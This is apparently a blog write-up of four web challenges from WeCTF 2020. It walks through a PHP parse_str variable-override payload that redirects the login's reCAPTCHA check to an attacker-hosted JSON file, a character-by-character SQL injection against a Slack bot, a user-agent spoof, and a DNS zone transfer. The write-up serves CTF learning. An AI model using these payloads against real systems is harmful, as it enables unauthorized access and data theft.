---
title: "WeCTF Plus Writeup"
date: 2020-12-20 00:05:00 -0800
categories: [CTF, writeup]
tags: [writeup, web]
toc: true
---

## Introduction

WebPlusCTF is a web-only CTF hosted by the University of California, Santa Barbra.

## dont bf me - 36 Solves

> Shou uses Recaptcha for his site to make it "safer". 

The point of this challenge is to abuse how ``parse_str`` works.

We are given some php files that show the code running behind the challenge. The two notable files are ``constant.php`` and ``login.php``.

Here is ``constant.php``:

```
<?php
// recaptcha
$PUB_KEY = getenv("PUB_KEY");
$PRIV_KEY = getenv("PRIV_KEY");
$RECAPTCHA_URL = "https://www.google.com/recaptcha/api/siteverify?secret=$PRIV_KEY&response=";

// password
$CORRECT_PASSWORD = getenv("PASSWORD");

// flag
$FLAG = getenv("FLAG");

// bug does not exist if we can't see it
error_reporting(0);
```

We can see that there are some variables set. Here is the login form:

```
<?php
include "constant.php";

parse_str($_SERVER["QUERY_STRING"]);

// check args
if (!isset($password) || !isset($_GET['g-recaptcha-response'])) {
    echo "Missing args :(";
    die();
}

// check recaptcha
$recaptcha_resp = json_decode(file_get_contents($RECAPTCHA_URL.$_GET['g-recaptcha-response']), true);
if(!$recaptcha_resp || !$recaptcha_resp["success"]) {
    echo "Bad recaptcha :(";
    die();
}

if ($recaptcha_resp["score"] < 0.8) {
    echo "Stop! Big hacker";
    die();
}

// check password
if($password == $CORRECT_PASSWORD) {
    echo $FLAG;
} else {
    echo "Wrong password :(";
}
```

The vulnerability is in this line: ``parse_str($_SERVER["QUERY_STRING"]);``. 

You can read up on the vulnerability [here](https://ctf-wiki.github.io/ctf-wiki/web/php/php/#parse_str-variable-override), but essentially we can use the character `&` to reference the variables already in place, and take those values and set them equal to the get parameter values. Additionally, we can re-declare and assign other already-declared variables. Looking at the code, we need to specify a few things in order to bypass all the checks, given that we can access to all the set variables.

First, looking at this line:

```
!isset($password) || !isset($_GET['g-recaptcha-response']
```

There needs to be two url parameters set, ``password`` and ``g-recaptcha-response``. 

Next, let's look at the next two checks.

```
$recaptcha_resp = json_decode(file_get_contents($RECAPTCHA_URL.$_GET['g-recaptcha-response']), true);
if(!$recaptcha_resp || !$recaptcha_resp["success"]) {
    echo "Bad recaptcha :(";
    die();
}

if ($recaptcha_resp["score"] < 0.8) {
    echo "Stop! Big hacker";
    die();
}
```

The first thing to note is this line: ``$RECAPTCHA_URL.$_GET['g-recaptcha-response'])``. This implies that the get param ``g-recaptcha-response`` should be attatched to the recaptch

Ok, the statement ``!$recaptcha_resp`` ensures that the response exists, and ``!$recaptcha_resp["success"]`` ensures that there is a value in the json file that is decoded named success, and that it has a value of true.

The second check looks to see if there is a score entry in the json with a value greater than 0.8. I can create the following payload ``payload.json``. I will host the file on my VPS so that the challenge servers can access it.

```
{"score":1.0, "success":true}
```

In order to make my file accessible, I create an HTTP Server using python. I do this so that you can go to the URL of my VPS and access the json file.

```
root@natem135:~/public# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...                           -
```

Here is my finished payload.

```
http://bfm.ny.ctf.so/login.php?password=&CORRECT_PASSWORD&RECAPTCHA_URL=http://natem135.xyz:8000/payload.json?&g-recaptcha-response=dummy
```

I enter the URL in my browser and I can see on my VPS that a request was recieved from the challenge server:

```
root@natem135:~/public# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...                           -
104.236.23.113 - - [20/Dec/2020 01:24:14] "GET /payload.json?dummy HTTP/1.0" 200
```

And I have the flag!

```
we{f3243131-45e1-4d82-9dfb-586760275ac6@0bvious1y_n0t_a_brutef0rc3_cha11}
```

## Hall of Fame - 22 Solves

> We made a Slack bot (@hof) to remember our past winners. Hope no one hacks it cuz we are running it on a really important database. 

On the Slack server for the challenge, we are given access to a bot. When typing the help command to see what we have access to, this is what we see:

![helpcommand](https://i.imgur.com/TDjDHY9.png)

The only command that takes in userinput is ``rank``, so that's what we will be exploiting. It takes in a team_name as the parameter. Looking at the given database file, we can see some examples of team names as well as where the flag is located ( ``Flag`` in ``Flags`` at index ``1``.)

Looking at the source code, we can see the method that queries the database with our userinput.

```
// rank <team_name>
func rankHandler(_ slacker.BotContext, request slacker.Request, response slacker.ResponseWriter) {
	teamName := request.Param("team_name")
	var r Rankings
	// query database
	_, _ = db.
		Where(fmt.Sprintf("team_name = '%s'", teamName)).
		Get(&r)
	// send response
	response.Reply(fmt.Sprintf("%d - %s", r.Rank, r.TeamName))
}
```

Let's try inputting one of the team names, ``UMR``.

```
Nathan Melwani  11:17 PM
rank UMR
hof2APP  11:17 PM
18 - UMR
```

Based on the method, we input a string and get a rank and team name out of it. This limits what information we are able to access significantly. We can assume our query is something like this:

```
SELECT * FROM rankings WHERE team_name = `<user input>`
```

We also know that we can get the flag with this query:

```
SELECT flag FROM flags
```

With this, we can create the following injection:

```
rank ' OR rank = (SELECT unicode(substr(flag,1))-105 FROM flags) OR rank = '
```

Let's go through each and every part of query. The first word `rank` is used to run the command that takes in our user input. The ``'`` character is used to close the string used for user input. We are using OR so that we can compare and get data to the flag itself. Skipping to the end, the last ``OR rank = '`` is used to close the query, so that it is valid. The full query would look something like this:

```
SELECT * FROM rankings WHERE team_name = '' OR rank = (SELECT unicode(substr(flag,1))-105 FROM flags) OR rank = ''
```

Now to explain the middle part. We will select the first character of the flag and run it through ``unicode()``, which returns an ascii value of that character of the string. The problem is, in order for the query to successfully result in output, it needs to be able to display a team name that corresponds to a proper team number. This means that the resulting number needs to be between 1 and 20, as these are the only team numbers in the database. Therefore, for the first character (and to show this injection works), I subtract it by 105. The flag format is ``we{*}``, so the first character is ``w``. We know the ascii value of ``w`` is 119. 119-105=14, so if this query works it will show the 14th ranked team.

```
Nathan Melwani  11:26 PM
rank ' OR rank = (SELECT unicode(substr(flag,1))-105 FROM flags) OR rank = '
hof2APP  11:26 PM
14 - w01verines
```

It worked! From this, you can tell that finding the full flag is very, very tedious. You have to keep guessing numbers to subtract by until you find one that is 20 lower than the correct char at that position. Here is one more example. The third char is ``{`` as per the flag format. The ascii value of ``{`` is 123. Therefore, we can use the following injection:

```
Nathan Melwani  11:39 PM
rank ' OR rank = (SELECT unicode(substr(flag,3))-120 FROM flags) OR rank = '
hof2APP  11:39 PM
3 - lsof -i:80
```

Sure enough, 123 (the unicode value at position 3) - 120 = 3, and we are able to see that it is 3 from the slack bot's output. If we were to subtract by a different number, say 60, then 123-60 > 20, so we will not see any output, as there is no corresponding team name for number 63. 

This means you will have to guess what to subtract by, as the range for values in the flag vary greatly. The values that make up the flag, ``-, 0-9, a-z, {, }`` span over 80 numbers, so finding the flag is very time consuming.

Here is the final flag:

```
we{676d13f9-47ef-4364-bc40-09d7761f9a58-br3k-s1ack-8y-sq1-inject1on}
```

## Baby Rev - 39 Solves

> Shou only allows his gay friends to view the flag here. We got intels that he used PHP extension for access control and we retrieved a weird binary.

In this challenge, we are given a compiled binary file. I used ``Ghidra`` to decompile it. After looking around, I noticed some interesting decompiled code in the ``ziv waf echo`` function.

```
  puVar2 = (ulong *)zend_hash_str_find(*(undefined8 *)(param_1 + 0x50),"HTTP_USER_AGENT",0xf);
  if (puVar2 == (ulong *)0x0) {
LAB_00101262:
    php_printf("Unauthorized Visit\n");
  }
  else {
    lVar3 = 0x10;
    bVar8 = 0xffffffffffffffe7 < *puVar2;
    pbVar4 = (byte *)(*puVar2 + 0x18);
    bVar9 = pbVar4 == (byte *)0x0;
    pbVar5 = (byte *)"Flag Viewer 2.0";
    do {
      if (lVar3 == 0) break;
      lVar3 = lVar3 + -1;
      bVar8 = *pbVar4 < *pbVar5;
      bVar9 = *pbVar4 == *pbVar5;
      pbVar4 = pbVar4 + (ulong)bVar10 * -2 + 1;
      pbVar5 = pbVar5 + (ulong)bVar10 * -2 + 1;
    } while (bVar9);
    if ((!bVar8 && !bVar9) != bVar8) goto LAB_00101262;
    php_printf(&DAT_00102020,uVar6,local_38 + 0x18);
  }
  *(undefined4 *)(param_2 + 8) = 3;
  ```

The thing that sticks out to be here is ``HTTP_USER_AGENT``. A user agent is like an identifier for a browser. Looking at the variable ``puVar2``, it is set equal to ``puVar4`` which is then compared to ``puVar5``. ``puVar5`` contains the string ``"Flag Viewer 2.0"``. Since this is a baby challenge, you can make the assumption that the challenge is not too complicated, and guess that this needs to be your user agent string. You can use the tool curl to request the web page with specified user agent, and get the flag.

```
curl -A "Flag Viewer 2.0" http://babyrev.ny.ctf.so/
```

```
we{e1a39122-6c82-4e09-8e84-d3a55dc28cca@fr3e_r3v-1n-w3bc7f!}
```


## Red Team - 62 Solves

> We overheard that Shou's company hoarded a shiny flag at a super secret subdomain. His company's domain: shoustinycompany.cf Note: You are allowed to use subdomain scanner in this challenge.


Ok, we are given a website and we have to find a subdomain with the flag. We are not allowed to use tools like dirbuster or burpsuite to brute-force for the subdomain ourself, so we would have to find the subdomain in some other way.

### Normal Solution
I tried to do this using the tool ``dig``, externally from my VM without any luck.

I was following this blog post where I got stuck: https://securitytrails.com/blog/dns-enumeration

After this, I noticed the note that we are allowed to use a ``subdomain scanner``. 

I used this tool: https://pentest-tools.com/information-gathering/find-subdomains-of-domain#

We find two subdomains:

```
ns1.shoustinycompany.cf
docs.shoustinycompany.cf
```

``ns1`` refers to a nameserver (meaning there will be no HTTP server off that subdomain, it can only be used for DNS queries) so we can ignore that subdomain for now. I went to ``docs`` and found the following information:

```
### Company's websites


Looking Glass: lookingglassv1.shoustinycompany.cf

Flag: [Removed by Shou]
```

Going to the lookingglass subdomain, we are taken to a webpage with the option to run the IP and DIG commands against the local server. Since the goal is to find subdomains, I googled for a way to do this Dig.

I found this Stack Overflow Post: https://stackoverflow.com/questions/131989/how-do-i-get-a-list-of-all-subdomains-of-a-domain

Using this query on the website: 

```
dig @ns1.shoustinycompany.cf shoustinycompany.cf axfr
```

Produces the following output:

```
Executed
dig @ns1.shoustinycompany.cf shoustinycompany.cf axfr
Result:

; <<>> DiG 9.14.12 <<>> @ns1.shoustinycompany.cf shoustinycompany.cf axfr
; (1 server found)
;; global options: +cmd
shoustinycompany.cf. 100 IN SOA ns1.shoustinycompany.cf. root.shoustinycompany.cf. 2 604800 86400 2419200 604800
shoustinycompany.cf. 100 IN NS ns1.shoustinycompany.cf.
shoustinycompany.cf. 100 IN A 142.93.28.144
docs.shoustinycompany.cf. 100 IN A 142.93.28.144
lookingglassv1.shoustinycompany.cf. 100 IN A 161.35.126.226
ns1.shoustinycompany.cf. 100 IN A 142.93.28.144
rea11ysu9erse3retsubd0ma1n00000.shoustinycompany.cf. 100 IN A 142.93.28.144
shoustinycompany.cf. 100 IN SOA ns1.shoustinycompany.cf. root.shoustinycompany.cf. 2 604800 86400 2419200 604800
;; Query time: 75 msec
;; SERVER: 142.93.28.144#53(142.93.28.144)
;; WHEN: Sun Dec 20 00:12:37 UTC 2020
;; XFR size: 8 records (messages 1, bytes 303)
```

### Cheese Solution

The following solution as not intended, and upon mentioning it to one of the organizers the challenge was changed so that this would not work.

Using this [website](https://www.nmmapper.com/sys/tools/subdomainfinder/), I was able to find the flag subdomain directly: ``su9erse3retsubd0ma1nucantf1ndlollllll.shoustinycompany.cf``.

```
we{be5620ad-20b5-4dc4-b4fd-a7a0246028e4@1_h0pe_u_l3arnt_ax7r}
```

